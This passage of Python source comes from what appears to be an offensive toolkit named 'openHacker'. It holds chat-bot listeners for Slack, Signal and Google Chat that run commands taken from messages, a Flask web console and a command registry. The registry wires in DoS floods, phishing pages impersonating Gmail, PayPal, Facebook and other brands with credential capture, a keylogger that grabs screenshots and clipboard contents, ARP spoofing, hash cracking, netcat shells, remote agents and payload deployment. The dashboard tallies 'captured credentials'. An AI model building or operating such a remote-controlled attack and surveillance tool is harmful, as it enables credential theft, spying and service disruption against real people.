            if self.client and self.running and os.path.exists(photo_path):
                asyncio.run_coroutine_threadsafe(
                    self.client.send_file(self.config['chat_id'], photo_path),
                    self.client.loop
                )
        except:
            pass


class SlackBot:
    def __init__(self, handler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.client = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "slack_config.json")):
                with open(os.path.join(CONFIG_DIR, "slack_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'bot_token': '', 'channel_id': '', 'prefix': '!'}
    
    def save_config(self, bot_token: str, channel_id: str = "", enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'bot_token': bot_token, 'channel_id': channel_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "slack_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not SLACK_AVAILABLE:
            return False
        if not self.config.get('bot_token'):
            return False
        self.client = WebClient(token=self.config['bot_token'])
        return True
    
    def start(self):
        if self.client:
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
            self.running = True
    
    def _monitor(self):
        channel = self.config.get('channel_id', 'general')
        last_ts = {}
        while self.running:
            try:
                response = self.client.conversations_history(channel=channel, limit=5)
                if response['ok'] and response['messages']:
                    for msg in response['messages']:
                        if msg.get('text', '').startswith(self.config.get('prefix', '!')):
                            ts = msg.get('ts')
                            if last_ts.get(channel) != ts:
                                last_ts[channel] = ts
                                cmd = msg['text'][len(self.config.get('prefix', '!')):].strip()
                                result = self.handler.execute(cmd, 'slack', msg.get('user', 'unknown'))
                                self.client.chat_postMessage(
                                    channel=channel,
                                    text=f"```{result.get('output', '')[:2000]}```\n*Time: {result.get('execution_time', 0):.2f}s*"
                                )
                time.sleep(2)
            except Exception as e:
                logger.error(f"Slack monitor error: {e}")
                time.sleep(10)
    
    def send_message(self, text: str):
        try:
            if self.client:
                self.client.chat_postMessage(
                    channel=self.config.get('channel_id', 'general'),
                    text=text[:4000]
                )
        except:
            pass


class SignalBot:
    def __init__(self, handler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "signal_config.json")):
                with open(os.path.join(CONFIG_DIR, "signal_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'phone_number': '', 'group_id': '', 'prefix': '!'}
    
    def save_config(self, phone_number: str, group_id: str = "", enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'phone_number': phone_number, 'group_id': group_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "signal_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        return SIGNAL_AVAILABLE and self.config.get('phone_number')
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
            self.running = True
    
    def _run(self):
        while self.running:
            try:
                result = subprocess.run(
                    ['signal-cli', 'receive', '--number', self.config['phone_number']],
                    capture_output=True, text=True, timeout=30
                )
                
                if result.stdout:
                    for line in result.stdout.splitlines():
                        if line.startswith('Message:'):
                            msg = line.replace('Message:', '').strip()
                            if msg.startswith(self.config.get('prefix', '!')):
                                cmd = msg[1:].strip()
                                resp = self.handler.execute(cmd, 'signal', 'signal_user')
                                self._send_message(resp.get('output', ''))
                time.sleep(5)
            except:
                time.sleep(10)
    
    def _send_message(self, text: str):
        try:
            cmd = ['signal-cli', 'send', '--number', self.config['phone_number']]
            if self.config.get('group_id'):
                cmd.extend(['--group', self.config['group_id']])
            cmd.extend(['--message', text[:4000]])
            subprocess.run(cmd, capture_output=True, timeout=10)
        except:
            pass
    
    def send_message(self, text: str):
        self._send_message(text)


class GoogleChatBot:
    def __init__(self, handler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "googlechat_config.json")):
                with open(os.path.join(CONFIG_DIR, "googlechat_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'webhook_url': '', 'space_id': '', 'prefix': '/'}
    
    def save_config(self, webhook_url: str, space_id: str = "", enabled: bool = True, prefix: str = '/') -> bool:
        try:
            config = {'enabled': enabled, 'webhook_url': webhook_url, 'space_id': space_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "googlechat_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        return self.config.get('webhook_url') is not None
    
    def start(self):
        if self.setup():
            self.running = True
    
    def send_message(self, text: str):
        try:
            data = {'text': text[:4000]}
            headers = {'Content-Type': 'application/json'}
            response = requests.post(self.config['webhook_url'], json=data, headers=headers, timeout=10)
            return response.status_code == 200
        except:
            return False


# =====================
# WEB DASHBOARD
# =====================
class WebDashboard:
    def __init__(self, handler, db: DatabaseManager, config: ConfigManager, 
                 threat_monitor=None, pdf_report=None):
        self.handler = handler
        self.db = db
        self.config = config
        self.threat_monitor = threat_monitor
        self.pdf_report = pdf_report
        self.app = None
        self.socketio = None
        self.running = False
    
    def create_app(self):
        if not WEB_AVAILABLE:
            return None
        
        app = Flask(__name__)
        app.config['SECRET_KEY'] = self.config.get('web.secret_key', secrets.token_hex(32))
        CORS(app)
        
        socketio = SocketIO(app, cors_allowed_origins="*")
        
        # Black & White Hacker Theme Web Interface
        TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>openHacker · cyber command</title>
  <style>
    /* ---------- RESET & GLOBAL ---------- */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #000000;
      color: #ffffff;
      font-family: 'Fira Code', 'Courier New', Courier, monospace;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1.5rem;
      position: relative;
      overflow-x: hidden;
    }

    /* animated grid & scanlines (black & white) */
    body::before {
      content: "";
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background-image: 
        linear-gradient(rgba(255, 255, 255, 0.02) 1px, transparent 1px),
        linear-gradient(90deg, rgba(255, 255, 255, 0.02) 1px, transparent 1px);
      background-size: 40px 40px;
      pointer-events: none;
      z-index: 0;
      animation: shiftGrid 24s linear infinite;
    }

    @keyframes shiftGrid {
      0% { background-position: 0 0; }
      100% { background-position: 40px 40px; }
    }

    /* scanline overlay */
    body::after {
      content: "";
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background: repeating-linear-gradient(
        0deg,
        rgba(0, 0, 0, 0.15) 0px,
        rgba(0, 0, 0, 0.15) 1px,
        transparent 1px,
        transparent 4px
      );
      pointer-events: none;
      z-index: 2;
    }

    /* main terminal card */
    .hacker-app {
      width: 100%;
      max-width: 1100px;
      background: rgba(0, 0, 0, 0.85);
      border: 2px solid #ffffff;
      box-shadow: 0 0 30px rgba(255, 255, 255, 0.3), 0 0 0 2px #000 inset;
      backdrop-filter: blur(4px);
      padding: 2rem 1.8rem 1.8rem;
      border-radius: 0;
      position: relative;
      z-index: 5;
      transition: box-shadow 0.3s;
      animation: borderPulse 4s infinite alternate;
    }

    @keyframes borderPulse {
      0% { box-shadow: 0 0 15px rgba(255,255,255,0.2), 0 0 0 2px #000 inset; }
      100% { box-shadow: 0 0 40px rgba(255,255,255,0.5), 0 0 0 2px #000 inset; }
    }

    /* header section */
    .header {
      display: flex;
      align-items: baseline;
      justify-content: space-between;
      margin-bottom: 2rem;
      border-bottom: 2px solid #fff;
      padding-bottom: 0.75rem;
      letter-spacing: 1px;
    }

    .logo {
      font-size: 2.4rem;
      font-weight: 800;
      text-transform: uppercase;
      display: flex;
      align-items: center;
      gap: 0.1rem;
      color: #fff;
      text-shadow: 0 0 8px #fff, 0 0 20px rgba(255,255,255,0.3);
    }

    .logo span {
      display: inline-block;
      animation: glitch 3.2s infinite;
    }

    .logo span:nth-child(1) { animation-delay: 0s; }
    .logo span:nth-child(2) { animation-delay: 0.1s; }
    .logo span:nth-child(3) { animation-delay: 0.2s; }
    .logo span:nth-child(4) { animation-delay: 0.3s; }
    .logo span:nth-child(5) { animation-delay: 0.4s; }
    .logo span:nth-child(6) { animation-delay: 0.5s; }
    .logo span:nth-child(7) { animation-delay: 0.6s; }
    .logo span:nth-child(8) { animation-delay: 0.7s; }
    .logo span:nth-child(9) { animation-delay: 0.8s; }
    .logo span:nth-child(10) { animation-delay: 0.9s; }

    @keyframes glitch {
      0%, 100% { transform: translate(0); }
      95% { transform: translate(1px, -1px); }
      96% { transform: translate(-1px, 1px); }
      97% { transform: translate(0); }
    }

    .badge {
      font-size: 0.9rem;
      border: 1px solid #fff;
      padding: 0.25rem 1rem;
      border-radius: 20px;
      background: #000;
      color: #fff;
      letter-spacing: 2px;
      font-weight: 400;
      text-transform: uppercase;
      animation: flicker 3s infinite;
    }

    @keyframes flicker {
      0%, 100% { opacity: 1; }
      45% { opacity: 0.6; }
      50% { opacity: 0.2; }
      55% { opacity: 0.9; }
    }

    /* status indicators */
    .status-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 1.2rem;
      font-size: 0.75rem;
      text-transform: uppercase;
      letter-spacing: 1.5px;
      color: #aaa;
      border-top: 1px solid #333;
      padding-top: 1rem;
    }

    .status-item {
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }

    .led {
      width: 8px;
      height: 8px;
      background: #fff;
      border-radius: 50%;
      box-shadow: 0 0 10px #fff;
      animation: pulse 1.8s infinite;
    }

    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.3; }
    }

    /* input area */
    .command-zone {
      display: flex;
      flex-direction: column;
      gap: 1.5rem;
      margin-bottom: 2rem;
    }

    .input-group {
      display: flex;
      align-items: center;
      background: #000;
      border: 2px solid #fff;
      padding: 0.2rem 0.2rem 0.2rem 1rem;
      transition: all 0.2s;
      box-shadow: 0 0 10px rgba(255,255,255,0.1);
    }

    .input-group:focus-within {
      box-shadow: 0 0 25px #fff, 0 0 0 2px #000 inset;
      transform: scale(1.01);
    }

    .prompt {
      color: #fff;
      font-weight: bold;
      font-size: 1.3rem;
      margin-right: 0.8rem;
      animation: blinkCursor 1s step-end infinite;
    }

    @keyframes blinkCursor {
      0%, 100% { opacity: 1; }
      50% { opacity: 0; }
    }

    #commandInput {
      flex: 1;
      background: transparent;
      border: none;
      outline: none;
      color: #fff;
      font-family: 'Fira Code', 'Courier New', monospace;
      font-size: 1.2rem;
      padding: 1rem 0.2rem;
      letter-spacing: 0.5px;
      caret-color: #fff;
    }

    #commandInput::placeholder {
      color: #888;
      font-style: italic;
      font-size: 1rem;
    }

    .execute-btn {
      background: #fff;
      color: #000;
      border: none;
      font-weight: 800;
      font-size: 1.1rem;
      padding: 1rem 2rem;
      cursor: pointer;
      text-transform: uppercase;
      letter-spacing: 2px;
      transition: all 0.2s;
      font-family: inherit;
      border-left: 2px solid #fff;
      display: flex;
      align-items: center;
      gap: 0.5rem;
      white-space: nowrap;
    }

    .execute-btn:hover {
      background: #000;
      color: #fff;
      box-shadow: 0 0 20px #fff;
    }

    .execute-btn:active {
      transform: scale(0.97);
    }

    /* quick command chips */
    .quick-commands {
      display: flex;
      flex-wrap: wrap;
      gap: 0.8rem;
      margin-bottom: 1rem;
      align-items: center;
    }

    .quick-label {
      font-size: 0.8rem;
      text-transform: uppercase;
      letter-spacing: 1px;
      border: 1px solid #555;
      padding: 0.3rem 0.8rem;
      border-radius: 20px;
      color: #ccc;
    }

    .chip {
      background: transparent;
      border: 1px solid #fff;
      color: #fff;
      padding: 0.5rem 1.1rem;
      border-radius: 30px;
      font-size: 0.9rem;
      cursor: pointer;
      font-family: inherit;
      transition: all 0.15s;
      text-transform: lowercase;
      letter-spacing: 0.5px;
      box-shadow: 0 0 5px rgba(255,255,255,0.1);
    }

    .chip:hover {
      background: #fff;
      color: #000;
      box-shadow: 0 0 18px #fff;
      transform: translateY(-2px);
    }

    /* terminal output window */
    .output-window {
      background: #000;
      border: 2px solid #fff;
      padding: 1.5rem;
      min-height: 300px;
      max-height: 400px;
      overflow-y: auto;
      font-size: 1rem;
      line-height: 1.6;
      color: #e0e0e0;
      box-shadow: inset 0 0 25px rgba(255,255,255,0.05), 0 0 15px rgba(255,255,255,0.2);
      scrollbar-width: thin;
      scrollbar-color: #fff #000;
      transition: all 0.2s;
      position: relative;
    }

    .output-window::-webkit-scrollbar {
      width: 8px;
    }

    .output-window::-webkit-scrollbar-track {
      background: #000;
      border-left: 1px solid #333;
    }

    .output-window::-webkit-scrollbar-thumb {
      background: #fff;
      border-radius: 0;
    }

    .output-line {
      display: flex;
      gap: 0.8rem;
      margin-bottom: 0.5rem;
      word-break: break-word;
      animation: typeIn 0.25s ease-out;
    }

    @keyframes typeIn {
      from { opacity: 0; transform: translateX(-8px); }
      to { opacity: 1; transform: translateX(0); }
    }

    .output-prompt {
      color: #fff;
      font-weight: bold;
      user-select: none;
      flex-shrink: 0;
    }

    .output-text {
      color: #ddd;
    }

    .output-text.success {
      color: #fff;
      font-weight: bold;
      text-shadow: 0 0 8px #fff;
    }

    .output-text.error {
      color: #aaa;
      text-decoration: line-through wavy #fff;
    }

    .output-text.info {
      color: #ccc;
      font-style: italic;
    }

    .blinking-cursor {
      display: inline-block;
      width: 10px;
      height: 1.2rem;
      background: #fff;
      vertical-align: middle;
      margin-left: 5px;
      animation: blink 1s step-end infinite;
    }

    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0; }
    }

    /* responsive */
    @media (max-width: 700px) {
      .hacker-app { padding: 1.2rem; }
      .logo { font-size: 1.8rem; }
      .execute-btn { padding: 1rem 1rem; font-size: 0.9rem; }
      .input-group { flex-wrap: wrap; }
      #commandInput { font-size: 1rem; }
      .chip { padding: 0.4rem 0.9rem; font-size: 0.8rem; }
      .badge { display: none; }
    }
  </style>
</head>
<body>
  <div class="hacker-app">
    <!-- header -->
    <div class="header">
      <div class="logo">
        <span>o</span><span>p</span><span>e</span><span>n</span><span>H</span><span>a</span><span>c</span><span>k</span><span>e</span><span>r</span>
      </div>
      <div class="badge">v1.0 · root</div>
    </div>

    <!-- main command input -->
    <div class="command-zone">
      <div class="input-group">
        <span class="prompt">$</span>
        <input type="text" id="commandInput" placeholder="enter command (e.g., help, nmap_quick 127.0.0.1, status)" autofocus>
        <button class="execute-btn" id="executeBtn">▶ run</button>
      </div>

      <!-- quick command chips -->
      <div class="quick-commands">
        <span class="quick-label">quick</span>
        <button class="chip" data-cmd="help">help</button>
        <button class="chip" data-cmd="status">status</button>
        <button class="chip" data-cmd="system">system</button>
        <button class="chip" data-cmd="threats">threats</button>
        <button class="chip" data-cmd="ping 127.0.0.1">ping</button>
        <button class="chip" data-cmd="nmap_quick 127.0.0.1">nmap</button>
        <button class="chip" data-cmd="nat_info">nat_info</button>
        <button class="chip" data-cmd="mac_info">mac_info</button>
        <button class="chip" data-cmd="arp_status">arp_status</button>
        <button class="chip" data-cmd="crack_list">crack_list</button>
      </div>
      <div class="quick-commands">
        <span class="quick-label">recon</span>
        <button class="chip" data-cmd="traceroute 127.0.0.1">traceroute</button>
        <button class="chip" data-cmd="whois google.com">whois</button>
        <button class="chip" data-cmd="dig google.com">dig</button>
        <button class="chip" data-cmd="location 127.0.0.1">location</button>
        <button class="chip" data-cmd="netmon_status">netmon</button>
        <button class="chip" data-cmd="traffic_types">traffic</button>
        <button class="chip" data-cmd="docker_ps">docker</button>
        <button class="chip" data-cmd="keylogger_status">keylog</button>
        <button class="chip" data-cmd="monitor_status">monitor</button>
      </div>
    </div>

    <!-- output terminal -->
    <div class="output-window" id="outputWindow">
      <div class="output-line">
        <span class="output-prompt">></span>
        <span class="output-text info">openHacker terminal ready. type a command or use chips.</span>
      </div>
      <div class="output-line">
        <span class="output-prompt">></span>
        <span class="output-text">┌─[ black & white cyber ops ]─┐</span>
      </div>
      <div class="output-line">
        <span class="output-prompt">></span>
        <span class="output-text">└──► awaiting input<span class="blinking-cursor"></span></span>
      </div>
    </div>

    <!-- status bar -->
    <div class="status-bar">
      <div class="status-item">
        <span class="led"></span> <span>connected · tty1</span>
      </div>
      <div class="status-item">
        <span id="statsDisplay">loading stats...</span>
      </div>
    </div>
  </div>

  <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
  <script>
    (function() {
      const socket = io();
      const input = document.getElementById('commandInput');
      const executeBtn = document.getElementById('executeBtn');
      const outputWindow = document.getElementById('outputWindow');
      const chips = document.querySelectorAll('.chip');
      const statsDisplay = document.getElementById('statsDisplay');

      // ---------- Helper: append output line ----------
      function appendOutput(command, response, type = 'info') {
        const line = document.createElement('div');
        line.className = 'output-line';

        const promptSpan = document.createElement('span');
        promptSpan.className = 'output-prompt';
        promptSpan.textContent = '$';

        const textSpan = document.createElement('span');
        textSpan.className = `output-text ${type}`;
        if (command) {
          textSpan.textContent = command;
        } else {
          textSpan.textContent = response;
        }

        line.appendChild(promptSpan);
        line.appendChild(textSpan);
        outputWindow.appendChild(line);

        // auto-scroll to bottom
        outputWindow.scrollTop = outputWindow.scrollHeight;

        // limit number of lines
        if (outputWindow.children.length > 100) {
          outputWindow.removeChild(outputWindow.children[0]);
        }
      }

      function appendMultiline(output, type = 'info') {
        const lines = output.split('\\n');
        lines.forEach(line => {
          if (line.trim() || line === '') {
            const div = document.createElement('div');
            div.className = `output-text ${type}`;
            div.textContent = line || ' ';
            div.style.marginLeft = '1.5rem';
            outputWindow.appendChild(div);
          }
        });
        outputWindow.scrollTop = outputWindow.scrollHeight;
      }

      // ---------- Execute command ----------
      function executeCommand(cmd) {
        const trimmed = cmd.trim();
        if (!trimmed) {
          appendOutput('', 'please enter a command.', 'error');
          return;
        }

        appendOutput(trimmed, '', 'info');

        fetch('/api/command', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ command: trimmed })
        })
        .then(response => response.json())
        .then(data => {
          if (data.success) {
            appendMultiline(data.output || '(no output)', 'success');
          } else {
            appendMultiline(data.output || 'Command failed', 'error');
          }
          updateStats();
        })
        .catch(err => {
          appendOutput('', 'connection error: ' + err, 'error');
        });
      }

      // ---------- Load stats ----------
      function updateStats() {
        fetch('/api/stats')
          .then(response => response.json())
          .then(data => {
            statsDisplay.textContent = `cmds:${data.total_commands||0} threats:${data.total_threats||0} ips:${data.total_managed_ips||0} creds:${data.captured_credentials||0}`;
          })
          .catch(() => {});
      }

      // ---------- Event listeners ----------
      executeBtn.addEventListener('click', function() {
        executeCommand(input.value);
        input.value = '';
        input.focus();
      });

      input.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
          e.preventDefault();
          executeCommand(input.value);
          input.value = '';
        }
      });

      chips.forEach(chip => {
        chip.addEventListener('click', function() {
          const cmd = this.getAttribute('data-cmd');
          if (cmd) {
            input.value = cmd;
            executeCommand(cmd);
            input.value = '';
            input.focus();
          }
        });
      });

      // socket for real-time updates
      socket.on('command_result', function(data) {
        console.log('Command result:', data);
      });

      // initial load
      window.addEventListener('load', function() {
        updateStats();
        setInterval(updateStats, 15000);
        input.focus();
      });
    })();
  </script>
</body>
</html>
        '''
        
        @app.route('/')
        def index():
            return render_template_string(TEMPLATE)
        
        @app.route('/api/command', methods=['POST'])
        def api_command():
            data = request.json
            command = data.get('command', '')
            result = self.handler.execute(command, 'web', 'web_user')
            socketio.emit('command_result', {
                'command': command,
                'output': result.get('output', '')[:2000],
                'execution_time': result.get('execution_time', 0)
            })
            return jsonify(result)
        
        @app.route('/api/stats')
        def api_stats():
            stats = self.db.get_statistics()
            return jsonify(stats)
        
        @app.route('/api/threats')
        def api_threats():
            threats = self.db.get_recent_threats(20)
            return jsonify({'threats': threats})
        
        @app.route('/api/platforms')
        def api_platforms():
            platforms = [
                {'name': 'discord', 'enabled': DISCORD_AVAILABLE},
                {'name': 'telegram', 'enabled': TELETHON_AVAILABLE},
                {'name': 'slack', 'enabled': SLACK_AVAILABLE},
                {'name': 'signal', 'enabled': SIGNAL_AVAILABLE},
                {'name': 'googlechat', 'enabled': GOOGLE_CHAT_AVAILABLE}
            ]
            return jsonify({'platforms': platforms})
        
        @app.route('/api/reports')
        def api_reports():
            if self.pdf_report:
                reports = self.pdf_report.get_reports(20)
                return jsonify({'reports': reports})
            return jsonify({'reports': []})
        
        self.app = app
        self.socketio = socketio
        return app
    
    def start(self):
        if not WEB_AVAILABLE:
            print(f"{Colors.WARNING}⚠️ Flask not available. Web dashboard disabled.{Colors.RESET}")
            return
        
        app = self.create_app()
        if app:
            port = self.config.get('web.port', 5000)
            host = self.config.get('web.host', '0.0.0.0')
            thread = threading.Thread(target=lambda: self.socketio.run(app, host=host, port=port, debug=False), daemon=True)
            thread.start()
            self.running = True
            print(f"{Colors.SUCCESS}✅ Web dashboard running at http://{host}:{port}{Colors.RESET}")

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    def __init__(self, db: DatabaseManager, ssh_manager: SSHManager = None,
                 traffic_gen: TrafficGeneratorEngine = None, nikto: NiktoScanner = None,
                 dos_engine: DOSEngine = None, spear_phishing: SpearPhishingEngine = None,
                 agent_engine: AgentEngine = None, network_monitor: NetworkMonitor = None,
                 keylogger: KeyloggerEngine = None, deployment_engine: DeploymentEngine = None,
                 domain_hosting: DomainHostingEngine = None,
                 cracking_engine: CrackingEngine = None,
                 arp_spoofing: ARPSpoofingEngine = None,
                 mac_manager: MACManager = None,
                 nat_info: NATInfoEngine = None,
                 email_composer: EmailComposerEngine = None,
                 pdf_report: PDFReportGenerator = None,
                 docker_scanner: DockerScanner = None,
                 threat_monitor: ThreatMonitorEngine = None):
        self.db = db
        self.ssh = ssh_manager
        self.traffic = traffic_gen
        self.nikto = nikto
        self.dos = dos_engine
        self.spear = spear_phishing
        self.agent = agent_engine
        self.network_monitor = network_monitor
        self.keylogger = keylogger
        self.deployment = deployment_engine
        self.domain_hosting = domain_hosting
        self.cracking = cracking_engine
        self.arp_spoofing = arp_spoofing
        self.mac_manager = mac_manager
        self.nat_info = nat_info
        self.email_composer = email_composer
        self.pdf_report = pdf_report
        self.docker_scanner = docker_scanner
        self.threat_monitor = threat_monitor
        self.social = SocialEngineeringTools(db)
        self.tools = NetworkTools()
        self.commands = self._build_commands()
    
    def _build_commands(self) -> Dict[str, Callable]:
        return {
            # Ping Commands
            'ping': self._ping,
            'ping6': self._ping6,
            'ping_sweep': self._ping_sweep,
            'fping': self._fping,
            'ping_count': self._ping_count,
            'ping_flood': self._ping_flood,
            'ping_timeout': self._ping_timeout,
            'ping_size': self._ping_size,
            'ping_interval': self._ping_interval,
            
            # Nmap Commands
            'nmap': self._nmap,
            'nmap_quick': self._nmap_quick,
            'nmap_full': self._nmap_full,
            'nmap_os': self._nmap_os,
            'nmap_service': self._nmap_service,
            'nmap_udp': self._nmap_udp,
            'nmap_vuln': self._nmap_vuln,
            'nmap_stealth': self._nmap_stealth,
            'nmap_ping': self._nmap_ping,
            'nmap_traceroute': self._nmap_traceroute,
            'nmap_script': self._nmap_script,
            'nmap_aggressive': self._nmap_aggressive,
            
            # Traceroute Commands
            'traceroute': self._traceroute,
            'tracert': self._traceroute,
            'tracepath': self._tracepath,
            'mtr': self._mtr,
            'tcptraceroute': self._tcptraceroute,
            'traceroute_udp': self._traceroute_udp,
            'traceroute_icmp': self._traceroute_icmp,
            
            # Wget Commands
            'wget': self._wget,
            'wget_file': self._wget_file,
            'wget_recursive': self._wget_recursive,
            'wget_mirror': self._wget_mirror,
            'wget_continue': self._wget_continue,
            'wget_limit': self._wget_limit,
            'wget_user_agent': self._wget_user_agent,
            'wget_header': self._wget_header,
            'wget_post': self._wget_post,
            'wget_auth': self._wget_auth,
            
            # Curl Commands
            'curl': self._curl,
            'curl_get': self._curl_get,
            'curl_post': self._curl_post,
            'curl_head': self._curl_head,
            'curl_options': self._curl_options,
            'curl_put': self._curl_put,
            'curl_delete': self._curl_delete,
            'curl_patch': self._curl_patch,
            'curl_auth': self._curl_auth,
            'curl_cookie': self._curl_cookie,
            'curl_follow': self._curl_follow,
            'curl_verbose': self._curl_verbose,
            
            # Netcat Commands
            'nc': self._netcat,
            'netcat': self._netcat,
            'nc_listen': self._nc_listen,
            'nc_scan': self._nc_scan,
            'nc_chat': self._nc_chat,
            'nc_transfer': self._nc_transfer,
            'nc_shell': self._nc_shell,
            
            # SSH Commands
            'ssh_add': self._ssh_add,
            'ssh_list': self._ssh_list,
            'ssh_connect': self._ssh_connect,
            'ssh_exec': self._ssh_exec,
            'ssh_disconnect': self._ssh_disconnect,
            'ssh_keygen': self._ssh_keygen,
            'ssh_copy_id': self._ssh_copy_id,
            'ssh_tunnel': self._ssh_tunnel,
            'ssh_sftp': self._ssh_sftp,
            
            # Traffic Generation
            'traffic': self._traffic,
            'traffic_types': self._traffic_types,
            'traffic_stop': self._traffic_stop,
            'traffic_status': self._traffic_status,
            'traffic_icmp': self._traffic_icmp,
            'traffic_tcp': self._traffic_tcp,
            'traffic_udp': self._traffic_udp,
            'traffic_http': self._traffic_http,
            'traffic_dns': self._traffic_dns,
            'traffic_arp': self._traffic_arp,
            'traffic_mixed': self._traffic_mixed,
            
            # Nikto Commands
            'nikto': self._nikto,
            'nikto_full': self._nikto_full,
            'nikto_ssl': self._nikto_ssl,
            'nikto_port': self._nikto_port,
            'nikto_tuning': self._nikto_tuning,
            
            # DOS Attacks
            'dos_syn': self._dos_syn,
            'dos_udp': self._dos_udp,
            'dos_http': self._dos_http,
            'dos_icmp': self._dos_icmp,
            'dos_stop': self._dos_stop,
            'dos_status': self._dos_status,
            'dos_slowloris': self._dos_slowloris,
            
            # Spear Phishing
            'spear_create': self._spear_create,
            'spear_send': self._spear_send,
            'spear_list': self._spear_list,
            
            # Agent Commands
            'agent_register': self._agent_register,
            'agent_command': self._agent_command,
            'agent_list': self._agent_list,
            'agent_status': self._agent_status,
            
            # Network Monitor
            'netmon_start': self._netmon_start,
            'netmon_stop': self._netmon_stop,
            'netmon_status': self._netmon_status,
            'netmon_packets': self._netmon_packets,
            'netmon_stats': self._netmon_stats,
            
            # Keylogger
            'keylogger_start': self._keylogger_start,
            'keylogger_stop': self._keylogger_stop,
            'keylogger_status': self._keylogger_status,
            'keylogger_logs': self._keylogger_logs,
            'keylogger_screenshots': self._keylogger_screenshots,
            'keylogger_clipboard': self._keylogger_clipboard,
            
            # Deployment
            'deploy_pdf': self._deploy_pdf,
            'deploy_email': self._deploy_email,
            'deploy_link': self._deploy_link,
            'deploy_executable': self._deploy_executable,
            'deploy_list': self._deploy_list,
            'deploy_track': self._deploy_track,
            
            # Domain Hosting
            'ip_to_domain': self._ip_to_domain,
            'domain_to_ip': self._domain_to_ip,
            'host_domain': self._host_domain,
            'host_website': self._host_website,
            'list_domains': self._list_domains,
            'domain_info': self._domain_info,
            
            # Social Engineering
            'phish_facebook': lambda _: self._phish('facebook'),
            'phish_instagram': lambda _: self._phish('instagram'),
            'phish_twitter': lambda _: self._phish('twitter'),
            'phish_gmail': lambda _: self._phish('gmail'),
            'phish_linkedin': lambda _: self._phish('linkedin'),
            'phish_microsoft': lambda _: self._phish('microsoft'),
            'phish_google': lambda _: self._phish('google'),
            'phish_apple': lambda _: self._phish('apple'),
            'phish_paypal': lambda _: self._phish('paypal'),
            'phish_amazon': lambda _: self._phish('amazon'),
            'phish_netflix': lambda _: self._phish('netflix'),
            'phish_spotify': lambda _: self._phish('spotify'),
            'phish_whatsapp': lambda _: self._phish('whatsapp'),
            'phish_telegram': lambda _: self._phish('telegram'),
            'phish_discord': lambda _: self._phish('discord'),
            'phish_start': self._phish_start,
            'phish_stop': self._phish_stop,
            'phish_creds': self._phish_creds,
            
            # Cracking Commands
            'crack': self._crack,
            'crack_status': self._crack_status,
            'crack_list': self._crack_list,
            'crack_md5': self._crack_md5,
            'crack_sha1': self._crack_sha1,
            'crack_sha256': self._crack_sha256,
            'crack_ntlm': self._crack_ntlm,
            
            # ARP Spoofing Commands
            'arp_spoof': self._arp_spoof,
            'arp_stop': self._arp_stop,
            'arp_status': self._arp_status,
            'arp_history': self._arp_history,
            'arp_scan': self._arp_scan,
            
            # MAC Commands
            'mac_info': self._mac_info,
            'mac_scan': self._mac_scan,
            'mac_vendor': self._mac_vendor,
            'mac_lookup': self._mac_lookup,
            
            # NAT Commands
            'nat_info': self._nat_info,
            'nat_public': self._nat_public,
            'nat_private': self._nat_private,
            'nat_router': self._nat_router,
            
            # Docker Commands
            'docker_scan': self._docker_scan,
            'docker_info': self._docker_info,
            'docker_ps': self._docker_ps,
            'docker_images': self._docker_images,
            'docker_bench': self._docker_bench,
            
            # Email Commands
            'email_compose': self._email_compose,
            'email_send': self._email_send,
            'email_list': self._email_list,
            'email_delete': self._email_delete,
            
            # PDF Report Commands
            'report_generate': self._report_generate,
            'report_list': self._report_list,
            
            # Threat Monitor Commands
            'monitor_start': self._monitor_start,
            'monitor_stop': self._monitor_stop,
            'monitor_add': self._monitor_add,
            'monitor_status': self._monitor_status,
            'monitor_list': self._monitor_list,
            'monitor_report': self._monitor_report,
            
            # Scan Commands
            'scan': self._scan,
            'quick_scan': self._quick_scan,
            'full_scan': self._full_scan,
            
            # IP Management
            'add_ip': self._add_ip,
            'remove_ip': self._remove_ip,
            'block_ip': self._block_ip,
            'unblock_ip': self._unblock_ip,
            'list_ips': self._list_ips,
            'ip_info': self._ip_info,
